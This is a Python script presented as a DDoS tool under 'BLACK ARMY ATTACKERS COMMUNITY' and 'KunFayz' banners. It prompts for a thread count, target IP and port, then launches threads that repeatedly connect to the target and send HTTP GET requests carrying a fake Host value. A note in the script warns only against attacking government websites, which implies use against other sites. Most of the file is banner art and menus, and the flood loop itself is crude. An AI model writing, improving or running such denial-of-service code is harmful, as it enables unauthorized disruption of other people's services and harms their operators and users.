#!/usr/bin/python3.12
# -*- coding: utf-8 -*-
import os
import socket
import threading
import time
from colorama import Fore, Style
def ddos():
    os.system("clear")
    print("press CTRL + C and press ENTER to exit !!")
    while True:

        try:
            print("\033[31m╔═════════════════════════════════════════════════════════════════╗")    
            print("\033[31m║\033[32m     ╔╗        ╔════╗  ╔╗    ╔╗ ╔═══════╗ ╔══════╗      ╔╗       \033[31m║")
            print("\033[31m║\033[32m     ║║       ╔╝╔══╗╚╗ ║║    ║║ ║╔═════╗║ ║╔════╗║     ║║  ╔╗    \033[31m║")
            print("\033[31m║\033[32m     ║║       ║╔╝  ╚╗║ ║║    ║║ ║║     ╚╝ ║║    ║║    ║║   ║║    \033[31m║")
            print("\033[31m║\033[32m     ║║       ║║    ║║ ║╚════╝║ ║╚════╗   ║║   ║╔╝   ║╚════╝║    \033[31m║")
            print("\033[31m║\033[32m     ║║       ║╚════╝║ ╚══╗╔══╝ ║╔════╝╔╗ ║╚═══╝╚╗   ╚═════╗║    \033[31m║")
            print("\033[31m║\033[32m     ║╚═════╗ ║╔════╗║    ║║    ║╚═════╝║ ║╔════╗║         ║║    \033[31m║")
            print("\033[31m║\033[32m     ╚══════╝ ╚╝    ╚╝    ╚╝    ╚═══════╝ ╚╝    ╚╝         ╚╝    \033[31m║")
            print("\033[31m╚═════════════════════════════════════════════════════════════════╝")
            print("\033[33m╔═════════════════════════════════════════════════════════════════╗\033[0m")    
            print("\033[33m║  \033[103m                \033[32mBLACK ARMY ATTACKERS COMMUNITY\033[103m               \033[0m  \033[33m║")
            print("\033[33m╚═════════════════════════════════════════════════════════════════╝\033[0m")
            print("\033[97m┏━━━KunFayz━━━⬣")
            threads = int(input("\033[97m┗━> Enter number of threads: \033[33m"))
        except ValueError:
            print("please enter a integer value")
            continue;
        else:
            break;
    attack_num = 0
    trget = str(input(Fore.WHITE + Style.BRIGHT + "┗━> Enter IP of the host: \033[33m"))
    fake = '192.178.1.38'
    #port = 80( default http port is 80)
    while True:
        try:
            port = int(input(f"{Fore.WHITE}┗━> Enter Port (default port: 80 ): \033[33m") or 80)
        except ValueError:
            print("Please enter a valid port , please try again")
            continue;
        else:
            break;
    print(f"performing Ddos on {trget} on PORT {port} using FAKE IP {fake} ")
    print(Fore.BLUE + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " if the above information is incorrect,you can restart the script and again enter the details correctly!!")
   # print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " Press CTRL + C and press Enter to Exit!")
    #print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" + Fore.WHITE + "Press CTRL + C and press enter to exit!!")
    time.sleep(4)
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "DDos starting in ~")
    print("seconds : 3")
    time.sleep(2)
    print("seconds : 2")
    time.sleep(2)
    print("seconds : 1")
    time.sleep(2)

    def attack():
        nonlocal attack_num
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((trget, port))
                s.sendto(("GET /" + trget + " HTTP/1.1\r\n").encode("ascii"), (trget, port))
                s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))

                time.sleep(2)
                attack_num += 1
                print(f"{Fore.LIGHTWHITE_EX}[]  {Fore.LIGHTCYAN_EX}M A L A C K  \033[103mSent massage\033[0m  \033[41m"+ str(attack_num)+"\033[0m \033[94m Starting\033[0")
                print(f"{Fore.LIGHTRED_EX}[]  {Fore.LIGHTBLUE_EX}M A L A C K  \033[7mSent massage\033[0m  \033[103m"+ str(attack_num)+"\033[0m \033[31m Starting\033[0m")
            except socket.error:
                time.sleep(2)
                print(f"{Fore.BLUE}[]  {Fore.YELLOW}Connection failed   \033[7m please check host\033[0m")
                print(f"{Fore.YELLOW}[]  {Fore.BLUE}Connection failed   \033[101m please check host\033[0m")
                break
                s.close()

    for i in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()

def print_red_centered_art():
    os.system("clear")
    print("""
\033[32m╔══════════════════════════════════════════════════════════════════════╗
\033[32m║                                                                      ║
\033[32m║  \033[0m\033[41m  ╔███╗╔███╗   ╔████╗  ╔█╗         ╔████╗   ╔████████╗╔█╗    ╔█╗  \033[0m  \033[32m║
\033[32m║  \033[0m\033[41m ║█╔══╗█╔═╗█║ ║█║  ║█║ ║█║        ║█║  ║█║ ║█╔═══════╝║█║   ║█║   \033[0m  \033[32m║
\033[32m║  \033[0m\033[41m ║█║  ║█║ ║█║║█║    ║█║║█║       ║█║    ║█║║█║        ║█║  ║█║    \033[0m  \033[32m║
\033[32m║  \033[0m\033[41m ║█║  ║█║ ║█║║█║    ║█║║█║       ║█║    ║█║║█║        ║█║ ║█║     \033[0m  \033[32m║
\033[32m║  \033[0m\033[41m ║█║  ║█║ ║█║║█║    ║█║║█║       ║█║    ║█║║█║        ║████║      \033[0m  \033[32m║
\033[32m║  \033[0m\033[7m ║█║  ║█║ ║█║║█║    ║█║║█║       ║█║    ║█║║█║        ║█╔╗█║      \033[0m  \033[32m║ 
\033[32m║  \033[0m\033[7m ║█║  ╚═╝ ║█║║████████║║█║       ║████████║║█║        ║█║  ║█║    \033[0m  \033[32m║
\033[32m║  \033[0m\033[7m ║█║      ║█║║█║    ║█║║████████╗║█║    ║█║ ╚████████╗║█║    ║█║  \033[0m  \033[32m║
\033[32m║  \033[0m\033[7m ╚═╝      ╚═╝╚═╝    ╚═╝╚════════╝╚═╝    ╚═╝  ╚═══════╝╚═╝    ╚═╝  \033[0m  \033[32m║
\033[32m║  \033[0m\033[7m                                                                  \033[0m  \033[32m║
\033[32m║                                                                      ║
\033[32m╚══════════════════════════════════════════════════════════════════════╝
    """)
    print(f"\r{Fore.LIGHTRED_EX}┏━━━KunFayz━━━⬣")
    print(f"\r{Fore.LIGHTRED_EX}┗━>{Fore.YELLOW}•80")
    red_art2 = f"\r{Fore.YELLOW}{Style.RESET_ALL}"
    print(f"\r{Fore.LIGHTGREEN_EX}┏━━━KunFayz━━━⬣")
    print(f"\r{Fore.LIGHTGREEN_EX}┗━>• Note: Do not use to attack government websites.")
if __name__ == "__main__":
    os.system("clear")
    print_red_centered_art()
def menu():
   # print("\r{Fore.LIGHTYELLOW_EX}[Info] Press CTRL + C and press enter to exit!!")
    print(f"\r{Fore.LIGHTYELLOW_EX}•••> [Info] Press CTRL + C and press enter to exit!!")
    print(f"\r{Fore.RED}——————————————————————————————————————————————————————————————————")
    print(f"\r{Fore.WHITE}┏⬣{Fore.YELLOW} Please type Y to continue...")
    print(Fore.WHITE + Style.BRIGHT + "┗> 1. DDos a website.  [Y]")
    print(Fore.WHITE + Style.BRIGHT + "┗> 2. exit.            [n]")
    print(f"\r{Fore.YELLOW}┏⬣ Enter your options  [e.g Y,n]") 
    global usr
    usr = input(Fore.YELLOW + Style.BRIGHT + "┗>: " )
    if usr == "Y":
        ddos()
    elif usr == "n":
        print("Exiting...")
        time.sleep(1)
    else:
        print("invalid option..try again.")
        menu()
menu()
